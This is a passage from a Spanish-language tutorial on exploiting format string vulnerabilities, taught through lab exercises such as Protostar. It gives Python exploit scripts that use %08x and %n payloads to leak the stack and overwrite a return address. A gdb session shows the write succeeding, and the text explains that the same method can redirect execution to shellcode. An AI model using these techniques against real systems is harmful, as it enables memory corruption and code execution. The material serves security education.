<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre></div></div>

<p>Creamos un input que comienza con <code class="highlighter-rouge">AA</code> -para lograr la alineación de la <code class="highlighter-rouge">ret_addr</code>- seguido de la dirección de retorno.    <br />
Si ejecutamos vemos al comienzo del output que la función <code class="highlighter-rouge">printf()</code> imprime las dos <code class="highlighter-rouge">"AA"</code> y la dirección de retorno como caracteres no imprimibles. Pero si observamos el resto de la impresión de la pila, vemos esas dos <code class="highlighter-rouge">0x4141</code> seguidas de la dirección <code class="highlighter-rouge">0xbffff364</code> (que subrayamos en la imagen a continuación).    <br />
<img src="/guia-escritura-exploits/format-string/imagenes/teoria/debug-protostar-2.png" alt="debug" /></p>

<p>Entonces sabemos que un determinado especificador <code class="highlighter-rouge">%08x</code> es el que imprime <code class="highlighter-rouge">0xbffff364</code>, por lo que nos queda descubrir cuál es. Con <code class="highlighter-rouge">gdb</code> después de prueba y error analizando el output y quitando parámetros, descubrimos que el <code class="highlighter-rouge">%08x</code> número 120 es el encargado de imprimir la <code class="highlighter-rouge">ret_addr</code>.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>                       
    <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">1000</span><span class="p">)[:</span><span class="mi">1000</span><span class="p">]</span>        

<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0xbffff364</span>             <span class="c">#addr a sobreescribir</span>

<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"AA"</span>                   
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x ."</span> <span class="o">*</span> <span class="mi">120</span>         <span class="c">#el último parámetro imprime la ret_addr</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre></div></div>

<p><img src="/guia-escritura-exploits/format-string/imagenes/teoria/debug-protonstar-4.png" alt="debug" />
Como vemos después de la dirección <code class="highlighter-rouge">0xbffff364</code> (subrayada en la imagen anterior) se continuan imprimiendo las “A” del padding.</p>

<p>En este punto si reemplazamos el parámetro <code class="highlighter-rouge">%08x</code> número 120 por <code class="highlighter-rouge">%n</code> ya no imprimimos la dirección de retorno sino que <strong>escribimos</strong> la cantidad de bytes impresos <strong>en</strong> la dirección de retorno <code class="highlighter-rouge">0xbffff364</code>.   <br />
Para probar escribir en memoria adecuamos el script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>                       
    <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">1000</span><span class="p">)[:</span><span class="mi">1000</span><span class="p">]</span>        

<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0xbffff364</span>             <span class="c">#addr a sobreescribir</span>

<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"AA"</span>                   
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x ."</span> <span class="o">*</span> <span class="mi">119</span>         <span class="c">#imprime pila</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">n"</span>                   <span class="c">#param. nro 120: sobreescribe ret_addr</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre></div></div>
<p>Cuando lo ejecutemos:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./r.sh gdb ./protonstar1
<span class="gp">(gdb) r "$</span><span class="o">(</span>./exploit.py<span class="o">)</span><span class="s2">"
</span><span class="go">Program received signal SIGSEGV, Segmentation fault.
0x000004ac in ?? ()
(gdb) x/wx 0xbffff364 
0xbffff364: 0x000004ac
</span></code></pre></div></div>
<p>Efectivamente logramos sobreescribir en la dirección de retorno <code class="highlighter-rouge">0xbffff364</code> el valor <code class="highlighter-rouge">0x000004ac</code>, que no es otra cosa que la cantidad de caracteres impresos hasta el <code class="highlighter-rouge">%n</code>. De ahí que cuando el programa intente retornar provoque una violación de segmento.
De esta manera podriamos sobreescribir una dirección de retorno o una entrada de la GOT por la dirección de nuestro shellcode por ejemplo, manipulando la cantidad de caracteres impresos por el format string para que el número que escribamos sea la dirección donde ubicamos el código malicioso. Esta estrategia se logra paso a paso en la <a href="/guia-escritura-exploits/format-string/5-practica.html">práctica 5</a>.</p>

<p>En conclusión es posible aprovecharse de vulnerabilidades del tipo format string para imprimir el contenido de la pila de un proceso o para escribir un valor arbitrario en una dirección de memoria arbitraria.</p>

<h3 id="práctica">Práctica</h3>
<p>Con los contenidos vistos hasta el momento es posible avanzar con <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/fs1.c">Fs 1</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/fs2.c">Fs 2</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/fs3.c">Fs 3</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/fs4.c">Fs 4</a> y <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/fs5.c">Fs 5</a>.</p>

<p>Y está disponible una práctica guiada para la <a href="/guia-escritura-exploits/format-string/5-practica.html">resolución de Fs 1 y Fs 2 a través de un ataque Format string</a>.</p>

<h3 id="material-consultado">Material consultado</h3>
<p>[1]. Bowes, Ron. (22 de Mayo de 2015). Defcon Quals: babyecho (format string vulns in gory detail). SkullSecurity [Post]. <em>Adventures in Security</em>. Recuperado de https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail</p>

<p>[2]. Protostar Format1. (Sin fecha). <em>Exploit exercises</em>. Recuperado de https://exploit-exercises.com/protostar/format1/</p>

<p>[3]. OWASP ASDR Project. (16 de abril de 2015). Format string attack. Recuperado de https://www.owasp.org/index.php/Format_string_attack</p>


</div>

    </div>

  </body>
</html>
